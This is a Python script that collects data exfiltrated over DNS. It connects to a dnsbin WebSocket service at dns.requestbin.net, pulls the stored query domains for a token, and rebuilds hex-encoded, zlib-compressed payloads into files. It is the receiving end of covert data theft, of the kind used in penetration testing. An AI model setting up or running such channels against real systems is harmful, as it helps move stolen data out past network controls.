#!/usr/bin/env python3

"""NOTE: requires websocket library."""

import binascii
import json
import sys
import zlib

from argparse import (
    ArgumentParser,
    RawTextHelpFormatter
)
from functools import partial
from operator import itemgetter

from websocket import create_connection

print_info = partial(print, '[*] ', sep='')
print_err = partial(print, '[!] ', sep='', file=sys.stderr)

URL = 'ws://dns.requestbin.net:8080/dnsbin'


def get_parsed_args():
    parser = ArgumentParser(
        prog='dnsbin_retriever.py',
        usage='dnsbin_retriever.py [OPTIONS]',
        description='retrieve compressed/encoded data sent to dnsbin',
        formatter_class=RawTextHelpFormatter
    )

    parser.add_argument(
        '-t', '--token',
        action='store',
        required=True,
        help='master token from requestbin url',
    )
    parser.add_argument(
        '-i', '--ignore-existing-data',
        action='store_true',
        default=False,
        help='ignore any data already stored in your session',
    )
    parser.add_argument(
        '--no-decompress',
        action='store_true',
        default=False,
        help='do not attempt to decompress encoded data (i.e., assume it\n'
             'is only encoded',
    )
    parser.add_argument(
        '-s', '--print-to-stdout',
        action='store_true',
        default=False,
        help='print retrieved payloads to stdout',
    )

    return parser.parse_args()


def init_ws(token):
    json_message = json.dumps(dict(
        restore=True,
        master=token
    ))

    ws = create_connection(URL)
    ws.send(json_message)
    return ws


def recover_data(domain_set, opts):
    """Re-compose a set of queried domains into the exfil-ed data."""
    domain_buckets = dict()

    for domain in domain_set:
        try:
            seq_num, sess, data = domain.split('.')
            seq_num = int(seq_num)
        except:
            print_err(f'Received malformed domain {domain}')
            return

        # store per-session data fragments as (index, data) tuples
        if sess in domain_buckets:
            domain_buckets[sess].append((seq_num, data))
        else:
            domain_buckets[sess] = [(seq_num, data)]

    for sess, entries in domain_buckets.items():
        print_info(f'Reconstructing data from session {sess}...')

        # check for missing sequence numbers
        seq_nums = set(map(itemgetter(0), entries))
        expected_seq_nums = set(range(0, max(seq_nums)))
        missing_seq_nums = expected_seq_nums - seq_nums
        if missing_seq_nums:
            print_err(
                f'Session {sess} missing sequence numbers: ' +
                ', '.join(str(s) for s in sorted(missing_seq_nums))
            )
            continue

        sorted_entries = list(sorted(entries, key=itemgetter(0)))
        data_fragments = map(itemgetter(1), sorted_entries)

        data = ''.join(data_fragments)
        try:
            data = binascii.unhexlify(data)
        except:
            print_err(f'Malformed hex-encoded data for session {sess}')
            continue


        if not opts.no_decompress:
            try:
                data = zlib.decompress(data)
            except Exception as e:
                raise e
                print_err(f'Malformed zlib-compressed data for session {sess}')
                continue

        if opts.print_to_stdout:
            try:
                print(data.decode())
            except:
                print_err(
                    f'Unable to decode data from session {sess} for writing '
                    'to stdout; was this supposed to be textual?'
                )

        fout = f'dnsbin.{sess}.bin'
        print_info(f'Writing raw data from session {sess} to {fout}')
        with open(fout, 'wb') as f:
            f.write(data)


def restore_session(ws):
    # consume initialization message
    ws.recv()

    # get any data already stored for our session
    resp = json.loads(ws.recv())

    try:
        return set(
            json.loads(entry['data'])['content'] for entry in resp['data']
        )
    except Exception as e:
        print_err('Got malformed session restore message from server')
        raise e


def main():
    try:
        opts = get_parsed_args()

        ws = init_ws(opts.token)
        domains = restore_session(ws)
        recover_data(domains, opts)
    except KeyboardInterrupt as e:
        print_err('Ctrl-C received; quitting now')
        return 0
    except Exception as e:
        print_err('Unexpected exception occured; re-raising it')
        raise e

    return 0


if __name__ == '__main__':
    sys.exit(main())
